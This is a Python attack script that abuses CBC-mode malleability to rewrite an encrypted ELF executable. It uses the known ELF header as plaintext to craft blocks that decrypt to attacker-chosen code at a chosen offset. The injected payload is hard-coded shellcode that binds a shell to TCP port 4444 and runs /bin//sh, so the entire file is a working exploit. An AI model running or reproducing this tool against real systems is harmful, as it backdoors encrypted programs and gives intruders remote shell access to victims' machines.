#!/usr/bin/env python3
import sys, binascii
block_size = IV_size = 0x10

def calc_X(C1, known_plain):
    return format(int(C1, 16) ^ int(known_plain, 16), 'x').zfill(block_size * 2)

def construct_c_prime(X, Mtarget):
    return binascii.unhexlify(format(int(X, 16) ^ int(Mtarget, 16), 'x').zfill(block_size * 2))

def padding(s, pad):
    return binascii.hexlify(pad).zfill(2) * (block_size - len(binascii.unhexlify(s)))

def adjust_shell(Mtargets, mod):
    for i in range(len(Mtargets)):
        m = Mtargets[i]
        m += padding(m, b'\x90')
        Mtargets[i] = m
    if mod == 15:
        print("[-] Too small space to inject the first code")
        quit()
    if mod > 0:
        snippet = b"90" * (block_size - mod - 2) + b"eb10"
        Mtargets.insert(0, snippet)
    return Mtargets

def main(argv):
    if len(argv) != 2:
        print("[-] Usage:\n\t$ %s [encrypted file]" % argv[0])
        quit()

    try:
        f = open(argv[1], 'rb')
        content = f.read()
        f.close()
    except IOError:
        print("[-] Failed to open the file.")
        quit()

    try:
        entry_point = int(input("The location to inject: "),16)
    except ValueError:
        print("[-] Input hex value. e.g., 0x4f0")
        quit()

    # The first block (M1hex[4] and M1hex[7] may be changed)
    M1hex = b"7f454c46020101000000000000000000"
    Y1 = content[IV_size:IV_size+block_size] # The first cipher block
    Mtargets = [b"eb0690909090909031c0409085c0eb10", b"eb069090909090900f855e030000eb10", b"eb0690909090909031c031db31d2eb10", b"eb06909090909090b00189c6fec0eb10", b"eb0690909090909089c7b206b029eb10", b"eb069090909090900f05934831c0eb10", b"eb0690909090909050680201115ceb10", b"eb0690909090909088442401eb12", b"eb069090909090904889e6b210eb11", b"eb0690909090909089dfb0310f05eb10", b"eb06909090909090b00589c689dfeb10", b"eb06909090909090b0320f0531d2eb10", b"eb0690909090909031f689dfb02beb10", b"eb069090909090900f0589c7eb12", b"eb069090909090904831c089c6eb11", b"eb06909090909090b0210f05fec0eb10", b"eb0690909090909089c6b0210f05eb10", b"eb06909090909090fec089c6b021eb10", b"eb069090909090900f054889c3eb11", b"eb06909090909090b86e2f7368eb11", b"eb0690909090909048c1e020eb12", b"eb069090909090904889c2eb13", b"eb06909090909090b8ff2f6269eb11", b"eb069090909090904801d04893eb11", b"eb0690909090909048c1eb0853eb11", b"eb069090909090904831d24889e7eb10", b"eb069090909090904831c05057eb11", b"eb069090909090904889e6b03beb11", b"eb06909090909090b03b0f0531c0eb10", b"eb0690909090909031db31c931d2eb10", b"eb06909090909090b066b30151eb11", b"eb069090909090906a066a016a02eb10", b"eb0690909090909089e1cd8089c6eb10", b"eb06909090909090b066b30252eb11", b"eb069090909090906668115c6653eb10", b"eb0690909090909089e16a105156eb10", b"eb0690909090909089e1cd80b066eb10", b"eb06909090909090b3046a0156eb11", b"eb0690909090909089e1cd80b066eb10", b"eb06909090909090b305525256eb11", b"eb0690909090909089e1cd8089c3eb10", b"eb0690909090909031c9b103fec9eb10", b"eb06909090909090b03fcd8075deeb10", b"eb0690909090909031c052eb13", b"eb06909090909090686e2f7368eb11", b"eb06909090909090682f2f6269eb11", b"eb0690909090909089e3525389e1eb10", b"eb069090909090905289e2b00bcd80"]

    # Make 16-byte aligned snippets
    mod = entry_point % block_size
    Mtargets = adjust_shell(Mtargets, mod)

    IV = content[:IV_size]
    skip = content[IV_size:IV_size+entry_point-mod-0x10]
    rest = content[IV_size+entry_point-mod+len(Mtargets)*0x20-0x10:]

    X1 = calc_X(binascii.hexlify(IV), M1hex)
    payload = IV + skip

    for m in Mtargets:
        payload += construct_c_prime(X1, m)
        payload += Y1
    payload += rest

    f = open(argv[1], 'wb')
    f.write(payload)
    f.close()

if __name__ == '__main__':
    main(sys.argv)
